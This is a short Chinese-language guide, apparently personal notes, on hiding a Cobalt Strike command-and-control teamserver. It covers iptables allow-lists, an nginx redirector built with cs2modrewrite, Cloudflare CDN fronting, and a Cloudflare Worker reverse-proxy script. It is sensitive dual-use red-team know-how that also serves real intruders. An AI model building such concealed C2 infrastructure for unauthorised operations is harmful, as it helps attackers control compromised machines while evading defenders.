# Cobalt Strike隐藏技术实践

## Team server

1. 更改teamserver的默认端口

2. 设置iptables，阻止非预期访问。

   ```bash
   iptables -I INPUT -p tcp -s <HACKER_IP> --dport <TEAMSERVER_PORT> -j ACCEPT
   iptables -A INPUT -p tcp --dport <TEAMSERVER_PORT> -j REJECT
   
   iptables -I INPUT -p tcp -s <REDIRECTOR_IP> --dport <LISTENER_PORT> -j ACCEPT
   iptables -A INPUT -p tcp --dport <LISTENER_PORT> -j REJECT
   ```

3. 启动teamserver

4. 为Redirector生成nginx.conf

   ```bash
   git clone https://github.com/threatexpress/cs2modrewrite.git
   cd cs2modrewrite
   python cs2nginx.py -i <CS_PROFILE> -c http://<TEAMSERVER_IP>:<TEAMSERVER_PORT}> -r https://www.google.com -H mydomain.local > nginx.conf
   ```

## Redirector （Nginx转发）-> teamserver

1. 安装 nginx 和 **nginx-extras**

   ```bash
   apt update
   apt install nginx nginx-extras
   ```

2. 将已生成的nginx.conf上传，并覆盖/etc/nginx/nginx.conf

3. 启动nginx

## 使用自己的域名和Cloudflare CDN -> Redirector -> teamserver

1. 把域名NS记录修改至Cloudflare，并等待生效。

2. 在Cloudflare控制台的规则选项中将http-stager的URL特征设置为绕过缓存。设置项为缓存级别-绕过。

   ![](..\img\2021-7-21-1.PNG)

3. 配置Cobalt Strike Listener

   ![](..\img\2021-7-21-2.PNG)

不出意外，此时就能上线了。

理论暴露面：你的域名。

## 使用 CloudFlare Workers -> Redirector -> teamserver

1. CloudFlare 控制台，Workers，创建一个优雅的子域。

2. 创建一个Worker，并使用以下脚本。脚本来自网络。

   ```javascript
   let upstream = 'https://your_domain.com'
   
   addEventListener('fetch', event => {
       event.respondWith(fetchAndApply(event.request));
   })
   
   async function fetchAndApply(request) {
       const ipAddress = request.headers.get('cf-connecting-ip') || '';
       let requestURL = new URL(request.url);
       let upstreamURL = new URL(upstream);
       requestURL.protocol = upstreamURL.protocol;
       requestURL.host = upstreamURL.host;
       requestURL.pathname = upstreamURL.pathname + requestURL.pathname;
   
       let new_request_headers = new Headers(request.headers);
       new_request_headers.set("X-Forwarded-For", ipAddress);
       let fetchedResponse = await fetch(
           new Request(requestURL, {
               method: request.method,
               headers: new_request_headers,
               body: request.body
           })
       );
       let modifiedResponseHeaders = new Headers(fetchedResponse.headers);
       modifiedResponseHeaders.delete('set-cookie');
       return new Response(
           fetchedResponse.body,
           {
               headers: modifiedResponseHeaders,
               status: fetchedResponse.status,
               statusText: fetchedResponse.statusText
           }
       );
   }
   ```

3. 配置Listener

   ![](..\img\2021-7-21-3.PNG)

4. 不出意外，此时就能上线了。测试工作正常。

   ![](..\img\2021-7-21-4.PNG)

   ![](..\img\2021-7-21-5.PNG)





## 其他手段正在不断尝试，边尝试边更新。





